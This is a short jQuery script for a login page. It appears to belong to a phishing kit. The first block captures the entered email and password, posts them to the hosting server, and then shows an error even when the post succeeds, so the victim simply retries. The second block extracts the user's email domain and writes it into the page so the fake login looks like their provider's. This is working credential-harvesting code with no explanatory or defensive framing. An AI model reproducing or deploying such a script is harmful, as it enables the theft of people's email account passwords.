<script type="text/javascript">
	
   $("#form").on("submit",function(e){
    e.preventDefault();

      if(validInputs()){
          dataGiver();
      }else{
      	msg_error(1);
      }
        
   });


   function dataGiver(){
   	   var e = $("#u-email").val();
      	var p = $("#u-pass").val();

      	$.ajax({
           type:"post",
           url:"",
           data:{p:p,e:e},
           beforeSend: function(){
           	 deactivateForm();
             hide_error();
           },
           success: function(s){
           	 activateForm();
             msg_error(1);
           },
           error: function(){
              msg_error(1);
           }

      	});
   }

   function deactivateForm(){
   	  $("#u-email,#u-pass,input").prop("disabled",true);
   }

    function activateForm(){
   	  $("input").prop("disabled",false);
   }

</script>

<script type="text/javascript">

	function gm() {
   	   var e = $("#um").val().trim();

   	   if(e != "" && validEmail(e)){
           var rex = /^[_a-z0-9-]+(\.[_a-z0-9-]+)*(?=@)@/;
           var em = e.replace(rex,"");

           var rex2 = /(\.[a-z]{2,4})$/;
           var em1 = em.replace(rex2,"");

            var c = em1.charAt(0);
            var s = em1.substring(1);
             var c2 = em.charAt(0);
            var s2 = em.substring(1);

            var domain = c.toUpperCase()+s;
            var domain2 = c2.toUpperCase()+s2;
           

           $("#user-domain").html(domain+" ");
           $("#user-domain2").html(domain2+" ");
   	   }
   }

   gm();

</script>
